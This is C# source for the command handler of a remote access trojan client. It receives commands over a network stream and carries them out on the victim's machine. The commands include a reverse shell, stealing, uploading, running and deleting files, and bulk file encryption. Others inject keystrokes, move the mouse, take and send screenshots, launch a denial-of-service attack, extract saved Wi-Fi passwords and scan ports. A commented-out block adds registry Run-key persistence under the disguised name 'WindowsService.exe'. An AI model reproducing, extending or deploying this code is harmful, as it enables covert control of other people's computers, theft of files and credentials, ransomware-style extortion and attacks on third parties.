using Protocol;
using System.Diagnostics;
using System.IO;
using System;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using Microsoft.Win32;
using WindowsService;


namespace Client3
{
    
    class Handle
    {
        private readonly IpHandler _ipHandler = new IpHandler();

        

        public string RunCmd(string command)
        {
            
            
            var proc = new Process();

            

            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = $"/c {command}";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.RedirectStandardError = true;

            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;

            proc.Start();

            var commandResult = proc.StandardOutput.ReadToEnd();

            proc.WaitForExit();
            return commandResult;

        }

        public enum Commands
        {
            GetIp,
            ScanPort,
            FileHandle,
            ReverseShell,
            Controller,
            ScreenShot,
            WebPage,
            NetworkMenu,
            UserInfo

        }

        public enum NetworkMenu
        {
            Dos,
            InterfaceInfo,
            WifiPasswordExtract,
            FtpBrute


        }

        public enum FileHandlerEnum
        {
            FileLooker,
            FileStealer,
            FileSender,
            FileRemover,
            FileEncrypter,
            FileExecuter
        }

        public static Commands GetCommands(int index)
        {
            var possbileCom = Enum.GetValues(typeof(Commands));

            return (Commands)possbileCom.GetValue(index);

        }

        public void Handler(Stream stream)
        {
            var adminCheck = new AdminCfg();
            adminCheck.Start();

            if (AdminBoolean.Instance.isEnabled)
            {
                stream.WriteString("[~] Admin turned on");
            }
            else
            {
                stream.WriteString("[~] Admin turned off.");
            }


            /*   
            var appName = "WindowsService.exe";

            var appPath = Application.ExecutablePath;

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            

            if (key.GetValue(appName) == null)
            {
                key.SetValue(appName, "\"" + appPath + "\"");
            }
            else
            {
                
            }
            
            */



            while (true)
            {
                var cmdIndex = stream.ReadString(); // index

                
                var selectedCommand = GetCommands(int.Parse(cmdIndex));

                switch (selectedCommand)
                {
                    
                    case Commands.GetIp:
                        var publicIp = _ipHandler.ReturnIp();
                        stream.WriteString($"{publicIp}\n");

                        break;
                    case Commands.ScanPort:
                        var ipScan = stream.ReadString();
                        var portScan = stream.ReadString();

                        PortScan.ScanPort(ipScan, portScan, stream);
                        break;

                    case Commands.FileHandle:
                        var possComands = Enum.GetValues(typeof(FileHandlerEnum));

                        var index = stream.ReadString();

                        var fileHandler = (FileHandlerEnum)possComands.GetValue(int.Parse(index));

                        switch (fileHandler)
                        {
                            case FileHandlerEnum.FileLooker:
                                var path = stream.ReadString();
                                var extension = stream.ReadString();

                                FileHandler.FileHandlerClient(stream, path, extension);

                                break;
                            case FileHandlerEnum.FileStealer:
                                var pathStealer = stream.ReadString();

                                FileStealer.SendFile(stream, pathStealer);

                                break;
                            case FileHandlerEnum.FileSender:
                                var pathWritten = stream.ReadString();

                                var bytes = stream.ReadBytes();

                                File.WriteAllBytes(pathWritten, bytes);

                                break;
                            case FileHandlerEnum.FileRemover:
                                var pathRemover = stream.ReadString();
                                File.Delete(pathRemover);

                                break;
                            case FileHandlerEnum.FileEncrypter:
                                var encrypterType = stream.ReadString();

                                if (encrypterType == "simpleEncrypter")
                                {
                                    var pathFile = stream.ReadString();
                                    FileEncrypter.EncryptFile(pathFile);

                                }
                                else if (encrypterType == "compuseEncrypt")
                                {
                                    var type = stream.ReadString();


                                    if (type == "simple")
                                    {
                                        var pathStart = stream.ReadString();
                                        var extensionStart = stream.ReadString();

                                        FileEncrypter.CompuseEncryptSimple(pathStart, extensionStart);
                                    }
                                    else if (type == "selective")
                                    {
                                        var pathInclused = stream.ReadString();
                                        FileEncrypter.CompuseEncryptSelective(pathInclused);

                                    }

                                }



                                break;

                            case FileHandlerEnum.FileExecuter:
                                var executerPath = stream.ReadString();
                                Process.Start(executerPath);

                                break;



                            default:
                                Console.WriteLine("");
                                break;
                        }
                        break;



                    case Commands.ReverseShell:
                        ReverseShell.ReverseShellClient(stream);

                        break;


                    case Commands.Controller:
                        var controller = stream.ReadString();

                        if (controller == "0")
                        {
                            var characters = stream.ReadString();
                            Thread.Sleep(1000);
                            SendKeys.SendWait(characters);
                            
                        }
                        else if (controller == "1")
                        {
                            var optionController = stream.ReadString();

                            if (optionController == "mouse-mover")
                            {
                                var x = stream.ReadString();
                                var y = stream.ReadString();


                                Cursor.Position = new Point(int.Parse(x), int.Parse(y));    

                            } else if (optionController == "mouse-jiggler")
                            {
                                var timesRotate = stream.ReadString();

                                for (int i = 0; i < int.Parse(timesRotate); i++)
                                {
                                    var rnd = new Random();
                                    var x = rnd.Next(0, 1920);

                                    var y = rnd.Next(0, 1080);


                                    Cursor.Position = new Point(x, y);
                                    Thread.Sleep(15);

                                }
                            }
                        }
                        
                        break;

                    case Commands.ScreenShot:


                        var user = Environment.UserName.ToString();
                        string pathScreenShot = $"C:\\Users\\{user}\\Documents\\Screenshot.jpeg";

                        ScreenShot.TakeScrenShot(pathScreenShot);

                        var bytesScreenshot = File.ReadAllBytes(pathScreenShot);

                        stream.WriteBytes(bytesScreenshot);

                        File.Delete(pathScreenShot);

                        break;

                    case Commands.WebPage:
                        var webUrl = stream.ReadString();   

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = webUrl,
                            UseShellExecute = true
                        });

                        break;
                    
                    case Commands.NetworkMenu:
                        var possCom = Enum.GetValues(typeof(NetworkMenu));

                        var ind = stream.ReadString();

                        var netHand = (NetworkMenu)possCom.GetValue(int.Parse(ind));

                        switch (netHand)
                        {
                            case NetworkMenu.Dos:
                                var hostName = stream.ReadString();
                                var path = stream.ReadString();

                                var nigus = new DoS();
                                nigus.Final(hostName, path);

                                break;
                            case NetworkMenu.InterfaceInfo:
                                var det = RunCmd("ipconfig /all");

                                stream.WriteString(det);
                                                                                                                                                                                                                                                                        
                                var det2 = RunCmd("netsh wlan show profiles");
  
                                stream.WriteString(det2);

         


                                break;

                            case NetworkMenu.WifiPasswordExtract:
                                var nameWifi = stream.ReadString();
                                var commandWifiPs = $"netsh wlan show profile name=\"{nameWifi}\" key=clear";

                                var det3 = RunCmd(commandWifiPs);
                                stream.WriteString(det3);



                                break;

                            case NetworkMenu.FtpBrute:

                                break;
                        }

                        continue;

                    case Commands.UserInfo:
                        var userInfo = new UserInfo();
                        userInfo.GetInfo(stream);

                        break;


                    default:
                        Console.WriteLine("");
                        break;
                   
                
                }
            }
        }
    }
}
